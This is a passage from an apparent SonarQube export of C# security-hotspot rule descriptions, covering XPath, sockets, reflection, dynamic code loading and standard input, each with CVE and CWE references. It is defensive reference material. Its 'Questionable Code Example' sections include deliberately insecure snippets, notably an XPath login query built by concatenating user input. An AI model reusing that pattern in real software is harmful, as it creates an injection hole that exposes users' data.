  <li> <a href=""https://www.securecoding.cert.org/confluence/x/g4HWAw"">CERT, FIO01-J.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/KQU"">CERT, FIO06-C.</a> - Create files with appropriate access permissions </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/c/FIO22-C.+Close+files+before+spawning+processes"">CERT, FIO22-C.</a> Close files before
  spawning processes </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Handling files is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<p>This rule will create issues when the following methods are called with a string XPath which is subject to injection (non-hardcoded string):</p>
<ul>
  <li> <code>System.Xml.XmlNode.SelectNodes(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectNodes(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Matches(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string, System.Xml.IXmlNamespaceResolver)</code> </li>
</ul>
<p>Calling these methods on subclasses of <code>XmlNode</code> and <code>XPathNavigator</code> will also raise an issue.</p>
<p>Methods receiving the XPath as an <code>XPathExpression</code> instead of a string will not raise an exception. The goal is to highlight the place
where the XPath string is compiled.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']"";
xpathNavigator.Evaluate(expression);  // Questionable. Check if the XPATH expression is safe.
</pre>
<h2>Exceptions</h2>
<p>Hard-coded XPath strings will not raise an issue.</p>
<pre>
xpathNavigator.Evaluate(""/users/user[@name='alice']"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",csharpsquid:S4817,cs,C#,"<p>Executing XPATH expressions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6272"">CVE-2016-6272</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9149"">CVE-2016-9149</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4837"">CVE-2012-4837</a> </li>
</ul>
<p>User provided data such as URL parameters should always be considered as untrusted and tainted. Constructing XPath expressions directly from
tainted data enables attackers to inject specially crafted values that changes the initial meaning of the expression itself. Successful XPath
injections attacks can read sensitive information from the XML document.</p>
<p>This rule will create issues when the following methods are called with a string XPath which is subject to injection (non-hardcoded string):</p>
<ul>
  <li> <code>System.Xml.XmlNode.SelectNodes(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectNodes(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XmlNode.SelectSingleNode(string, System.Xml.XmlNamespaceManager)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Evaluate(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Matches(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.Select(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathNavigator.SelectSingleNode(string, System.Xml.IXmlNamespaceResolver)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string)</code> </li>
  <li> <code>System.Xml.XPath.XPathExpression.Compile(string, System.Xml.IXmlNamespaceResolver)</code> </li>
</ul>
<p>Calling these methods on subclasses of <code>XmlNode</code> and <code>XPathNavigator</code> will also raise an issue.</p>
<p>Methods receiving the XPath as an <code>XPathExpression</code> instead of a string will not raise an exception. The goal is to highlight the place
where the XPath string is compiled.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the XPATH expression might contain some unsafe input coming from a user. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Sanitize any user input before using it in an XPATH expression.</p>
<h2>Questionable Code Example</h2>
<pre>
String expression = ""/users/user[@name='"" + user + ""' and @pass='"" + pass + ""']"";
xpathNavigator.Evaluate(expression);  // Questionable. Check if the XPATH expression is safe.
</pre>
<h2>Exceptions</h2>
<p>Hard-coded XPath strings will not raise an issue.</p>
<pre>
xpathNavigator.Evaluate(""/users/user[@name='alice']"");
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/643"">MITRE, CWE-643</a> - Improper Neutralization of Data within XPath Expressions </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/BwLEAw"">CERT, IDS53-J.</a> - Prevent XPath Injection </li>
</ul>",Executing XPath expressions is security-sensitive,[],CRITICAL,"['cert', 'cwe', 'owasp-a1']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
using System.Net.Sockets;

class TestSocket
{
    public static void Run()
    {
        // Questionable
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        // TcpClient and UdpClient simply abstract the details of creating a Socket
        TcpClient client = new TcpClient(""example.com"", 80); // Questionable
        UdpClient listener = new UdpClient(80); // Questionable
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",csharpsquid:S4818,cs,C#,"<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785"">CVE-2011-178</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645"">CVE-2017-5645</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597"">CVE-2018-6597</a> </li>
</ul>
<p>Sockets are vulnerable in multiple ways:</p>
<ul>
  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive
  sensitive information or inject dangerous input. </li>
  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>
</ul>
<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the
use of http connections.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> sockets are created without any limit every time a user performs an action. </li>
  <li> input received from sockets is used without being sanitized. </li>
  <li> sensitive data is sent via sockets without being encrypted. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>
  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>
  <li> <a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> any input read from the socket. </li>
  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>
</ul>
<h2>Questionable Code Example</h2>
<pre>
using System.Net.Sockets;

class TestSocket
{
    public static void Run()
    {
        // Questionable
        Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        // TcpClient and UdpClient simply abstract the details of creating a Socket
        TcpClient client = new TcpClient(""example.com"", 80); // Questionable
        UdpClient listener = new UdpClient(80); // Questionable
    }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/20"">MITRE, CWE-20</a> - Improper Input Validation </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/400"">MITRE, CWE-400</a> - Uncontrolled Resource Consumption ('Resource Exhaustion') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/200"">MITRE, CWE-200</a> - Information Exposure </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat2"">SANS Top 25</a> - Risky Resource Management </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Using Sockets is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous', 'sans-top25-risky']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<h2>Questionable Code Example</h2>
<pre>
using System.Reflection;

Type dynClass = Type.GetType(""MyInternalClass"");
// Questionable. Using BindingFlags.NonPublic will return non-public members
BindingFlags bindingAttr = BindingFlags.NonPublic | BindingFlags.Static;
MethodInfo dynMethod = dynClass.GetMethod(""mymethod"", bindingAttr);
object result = dynMethod.Invoke(dynClass, null);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",csharpsquid:S3011,cs,C#,"<p>Changing or bypassing accessibility is security-sensitive. For example, it has led in the past to the following vulnerability:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-4681"">CVE-2012-4681</a> </li>
</ul>
<p><code>private</code> methods were made <code>private</code> for a reason, and the same is true of every other visibility level. Altering or
bypassing the accessibility of classes, methods, or fields violates the encapsulation principle and could introduce security holes.</p>
<p>This rule raises an issue when reflection is used to change the visibility of a class, method or field, and when it is used to directly update a
field value.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> there is a good reason to override the existing accessibility level of the method/field. This is very rarely the case. Accessing hidden fields
  and methods will make your code unstable as they are not part of the public API and may change in future versions. </li>
  <li> this method is called by untrusted code. <strong>*</strong> </li>
  <li> it is possible to modify or bypass the accessibility of sensitive methods or fields using this code. <strong>*</strong> </li>
</ul>
<p><strong>*</strong> You are at risk if you answered yes to those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Don't change or bypass the accessibility of any method or field if possible.</p>
<p>If untrusted code can execute this method, make sure that it cannot decide which method or field's accessibility can be modified or bypassed.</p>
<h2>Questionable Code Example</h2>
<pre>
using System.Reflection;

Type dynClass = Type.GetType(""MyInternalClass"");
// Questionable. Using BindingFlags.NonPublic will return non-public members
BindingFlags bindingAttr = BindingFlags.NonPublic | BindingFlags.Static;
MethodInfo dynMethod = dynClass.GetMethod(""mymethod"", bindingAttr);
object result = dynMethod.Invoke(dynClass, null);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/3YEVAQ"">CERT, SEC05-J.</a> - Do not use reflection to increase accessibility of
  classes, methods, or fields </li>
</ul>",Changing or bypassing accessibility is security-sensitive,[],CRITICAL,"['cert', 'owasp-a3']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to let external sources either:</p>
<ul>
  <li> execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the
  server or in the client (exemple: XSS attack). </li>
  <li> select the code which will be executed via reflection. </li>
</ul>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Questionable Code Example</h2>
<pre>
using System;
using System.Reflection;

class TestReflection
{
    public static void Run(string typeName, string methodName, string fieldName, string propertyName, string moduleName)
    {
        Assembly.Load(...); // Questionable
        Assembly.LoadFile(...); // Questionable
        Assembly.LoadFrom(...); // Questionable
        Assembly.LoadWithPartialName(...); // Questionable + deprecated

        Assembly.ReflectionOnlyLoad(...);  // This is OK as the resulting type is not executable.
        Assembly.ReflectionOnlyLoadFrom(...); // This is OK as the resulting type is not executable.

        Assembly assembly = typeof(TestReflection).Assembly;

        // Review this code to make sure that the module, type, method and field are safe
        Type type = assembly.GetType(typeName); // Questionable
        Module module = assembly.GetModule(moduleName); // Questionable

        type = System.Type.GetType(typeName); // Questionable
        type = type.GetNestedType(typeName); // Questionable
        type = type.GetInterface(typeName);  // Questionable
        MethodInfo method = type.GetMethod(methodName); // Questionable
        FieldInfo field = type.GetField(fieldName); // Questionable
        PropertyInfo property = type.GetProperty(propertyName); // Questionable


        // Review this code to make sure that the modules, types, methods and fields are used safely
        Module[] modules = assembly.GetModules(); // Questionable
        modules = assembly.GetLoadedModules(); // Questionable

        Type[] types = assembly.GetTypes(); // Questionable
        types = assembly.GetExportedTypes(); // Questionable

        types = type.GetNestedTypes(); // Questionable
        MethodInfo[] methods = type.GetMethods(); // Questionable
        FieldInfo[] fields = type.GetFields(); // Questionable
        PropertyInfo[] properties = type.GetProperties(); // Questionable
        MemberInfo[] members = type.GetMembers(); // Questionable
        members = type.GetMember(methodName); // Questionable
        members = type.GetDefaultMembers(); // Questionable

        type.InvokeMember(...); // Questionable, when the method name is provided as a string

        assembly.CreateInstance(typeName); // Questionable


        type = Type.ReflectionOnlyGetType(typeName,true, true); // This is OK as the resulting type is not executable.

        Activator.CreateComInstanceFrom(...); // Questionable, when the type name is provided as a string
        Activator.CreateInstance(...); // Questionable, when the type name is provided as a string
        Activator.CreateInstanceFrom(...); // Questionable, when the type name is provided as a string
        Activator.CreateInstance&lt;&gt;(); // OK - can only be created from a referenced type
    }
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be created if one of the methods above is called with a hard-coded type/method/field/property/interface/module name. There can be no
injection in this specific scenario.</p>
<p>Example:</p>
<pre>
assembly.GetType(""MyHardcodedType"")
</pre>
<p>No issue will be created if one of the methods is called on an instance of <em>Type</em> created using <em>typeof</em>. There can be no injection
in this specific scenario.</p>
<p>Example:</p>
<pre>
typeof(CustomType).GetMethods();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",csharpsquid:S1523,cs,C#,"<p>Executing code dynamically is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807"">CVE-2017-9807</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802"">CVE-2017-9802</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9182"">CVE-2016-9182</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000210"">CVE-2018-1000210</a> </li>
</ul>
<p>It is dangerous to let external sources either:</p>
<ul>
  <li> execute unknown code in your process. Such <a href=""https://www.owasp.org/index.php/Code_Injection"">Injected Code</a> can either run on the
  server or in the client (exemple: XSS attack). </li>
  <li> select the code which will be executed via reflection. </li>
</ul>
<p>This rule marks for review each occurence of such dynamic code execution. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> the executed code may come from a untrusted source and hasn't been sanitized. </li>
  <li> the code to run is dynamically chosen via reflection, and an untrusted source can use it to choose which code to run. For example a class could
  be retrieved by its name and this name comes from a user input. </li>
</ul>
<p>You are at risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Regarding the execution of unknown code, the best solution is to not run code provided by an untrusted source. If you really need to do it, run the
code in a <a href=""https://en.wikipedia.org/wiki/Sandbox_(computer_security)"">sandboxed</a> environment. Use jails, firewalls and whatever means your
operating system and programming language provide (example: <a
href=""https://wiki.sei.cmu.edu/confluence/display/java/SEC54-J.+Create+a+secure+sandbox+using+a+security+manager"">Security Managers</a> in java, <a
href=""https://www.w3schools.com/tags/att_iframe_sandbox.asp"">iframes</a> and <a href=""https://en.wikipedia.org/wiki/Same-origin_policy"">same-origin
policy</a> for javascript in a web browser).</p>
<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>
<p>As for the use of reflection, it should be strictly controlled as it can lead to many vulnerabilities. Never let an untrusted source decide what
code to run. If you have to do it anyway, create a list of allowed code and choose among this list.</p>
<h2>Questionable Code Example</h2>
<pre>
using System;
using System.Reflection;

class TestReflection
{
    public static void Run(string typeName, string methodName, string fieldName, string propertyName, string moduleName)
    {
        Assembly.Load(...); // Questionable
        Assembly.LoadFile(...); // Questionable
        Assembly.LoadFrom(...); // Questionable
        Assembly.LoadWithPartialName(...); // Questionable + deprecated

        Assembly.ReflectionOnlyLoad(...);  // This is OK as the resulting type is not executable.
        Assembly.ReflectionOnlyLoadFrom(...); // This is OK as the resulting type is not executable.

        Assembly assembly = typeof(TestReflection).Assembly;

        // Review this code to make sure that the module, type, method and field are safe
        Type type = assembly.GetType(typeName); // Questionable
        Module module = assembly.GetModule(moduleName); // Questionable

        type = System.Type.GetType(typeName); // Questionable
        type = type.GetNestedType(typeName); // Questionable
        type = type.GetInterface(typeName);  // Questionable
        MethodInfo method = type.GetMethod(methodName); // Questionable
        FieldInfo field = type.GetField(fieldName); // Questionable
        PropertyInfo property = type.GetProperty(propertyName); // Questionable


        // Review this code to make sure that the modules, types, methods and fields are used safely
        Module[] modules = assembly.GetModules(); // Questionable
        modules = assembly.GetLoadedModules(); // Questionable

        Type[] types = assembly.GetTypes(); // Questionable
        types = assembly.GetExportedTypes(); // Questionable

        types = type.GetNestedTypes(); // Questionable
        MethodInfo[] methods = type.GetMethods(); // Questionable
        FieldInfo[] fields = type.GetFields(); // Questionable
        PropertyInfo[] properties = type.GetProperties(); // Questionable
        MemberInfo[] members = type.GetMembers(); // Questionable
        members = type.GetMember(methodName); // Questionable
        members = type.GetDefaultMembers(); // Questionable

        type.InvokeMember(...); // Questionable, when the method name is provided as a string

        assembly.CreateInstance(typeName); // Questionable


        type = Type.ReflectionOnlyGetType(typeName,true, true); // This is OK as the resulting type is not executable.

        Activator.CreateComInstanceFrom(...); // Questionable, when the type name is provided as a string
        Activator.CreateInstance(...); // Questionable, when the type name is provided as a string
        Activator.CreateInstanceFrom(...); // Questionable, when the type name is provided as a string
        Activator.CreateInstance&lt;&gt;(); // OK - can only be created from a referenced type
    }
}
</pre>
<h2>Exceptions</h2>
<p>No issue will be created if one of the methods above is called with a hard-coded type/method/field/property/interface/module name. There can be no
injection in this specific scenario.</p>
<p>Example:</p>
<pre>
assembly.GetType(""MyHardcodedType"")
</pre>
<p>No issue will be created if one of the methods is called on an instance of <em>Type</em> created using <em>typeof</em>. There can be no injection
in this specific scenario.</p>
<p>Example:</p>
<pre>
typeof(CustomType).GetMethods();
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/95.html"">MITRE CWE-95</a> - Improper Neutralization of Directives in Dynamically Evaluated Code
  ('Eval Injection') </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/470.html"">MITRE CWE-470</a> - Use of Externally-Controlled Input to Select Classes or Code
  ('Unsafe Reflection') </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A7 - Cross-Site Scripting (XSS) </li>
</ul>",Dynamically executing code is security-sensitive,[],CRITICAL,"['cwe', 'owasp-a1', 'owasp-a7']",SECURITY_HOTSPOT
2018-11-29T11:10:36+0100,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> data read from the standard input is not sanitized before being used. </li>
</ul>
<p>You are at risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p><a href=""https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet"">Sanitize</a> all data read from the standard input before using it.</p>
<h2>Questionable Code Example</h2>
<pre>
using System;
public class C
{
    public void Main()
    {
        Console.In; // Questionable
        var code = Console.Read(); // Questionable
        var keyInfo = Console.ReadKey(...); // Questionable
        var text = Console.ReadLine(); // Questionable
        Console.OpenStandardInput(...); // Questionable
    }
}
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise issues when the return value of the <code>Console.Read</code> <code>Console.ReadKey</code> or
<code>Console.ReadLine</code> methods is ignored.</p>
<pre>
using System;
public class C
{
    public void Main()
    {
        Console.ReadKey(...); // Return value is ignored
        Console.ReadLine(); // Return value is ignored
    }
}
</pre>
<h2>See:</h2>
<ul>
  <li> <a href=""https://cwe.mitre.org/data/definitions/20.html"">MITRE, CWE-20</a> - Improper Input Validation </li>
</ul>",csharpsquid:S4829,cs,C#,"<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337"">CVE-2005-2337</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449"">CVE-2017-11449</a> </li>
</ul>
<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)
can be dangerous and should be validated.</p>
<p>This rule flags code that reads from the standard input.</p>
<h2>Ask Yourself Whether</h2>
<ul>
